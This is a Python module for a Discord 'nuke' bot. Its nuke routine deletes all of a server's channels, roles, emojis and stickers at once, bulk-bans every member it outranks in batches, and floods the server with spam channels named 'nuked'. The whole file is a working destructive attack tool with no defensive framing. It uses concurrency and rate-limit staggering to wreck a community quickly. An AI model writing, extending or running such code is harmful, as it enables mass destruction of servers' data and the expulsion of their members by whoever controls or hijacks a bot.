import asyncio

class NukeCommands:
    def __init__(self, bot):
        self.bot = bot

    async def nuke(self, guild):
        print(f"[!] Nuking {guild.name}...")
        await asyncio.gather(
            self.delete_all_channels(guild),
            self.delete_all_roles(guild),
            self.delete_all_emojis(guild),
            self.delete_all_stickers(guild),
            self.ban_all_members(guild),
            self.create_flood(guild, "nuked", 50),
        )

    async def delete_all_channels(self, guild):
        tasks = []
        for channel in guild.channels:
            tasks.append(self.bot.raw_delete(guild.id, "channels", channel.id))
        await asyncio.gather(*tasks, return_exceptions=True)

    async def delete_all_roles(self, guild):
        tasks = []
        for role in guild.roles:
            if role.is_default() or role.managed:
                continue
            if role >= guild.me.top_role:
                continue
            tasks.append(self.bot.raw_delete(guild.id, "roles", role.id))
        await asyncio.gather(*tasks, return_exceptions=True)

    async def delete_all_emojis(self, guild):
        tasks = []
        for emoji in guild.emojis:
            tasks.append(self.bot.raw_delete(guild.id, "emojis", emoji.id))
        await asyncio.gather(*tasks, return_exceptions=True)

    async def delete_all_stickers(self, guild):
        tasks = []
        for sticker in guild.stickers:
            tasks.append(self.bot.raw_delete(guild.id, "stickers", sticker.id))
        await asyncio.gather(*tasks, return_exceptions=True)

    async def ban_all_members(self, guild):
        members = [m for m in guild.members if m.id != guild.me.id and guild.me.top_role > m.top_role]
        chunk_size = 200
        for i in range(0, len(members), chunk_size):
            chunk = members[i:i+chunk_size]
            payload = {"user_ids": [str(m.id) for m in chunk]}
            await self.bot.raw_post(guild.id, "bulk-ban", json_data=payload)
            await asyncio.sleep(0.5)  # slight stagger for bulk ban rate limit

    async def create_flood(self, guild, name, count):
        tasks = []
        for i in range(count):
            payload = {"name": f"{name}-{i}", "type": 0}
            tasks.append(self.bot.raw_post(guild.id, "channels", json_data=payload))
            if len(tasks) >= 20:
                await asyncio.gather(*tasks, return_exceptions=True)
                tasks = []
        if tasks:
            await asyncio.gather(*tasks, return_exceptions=True)
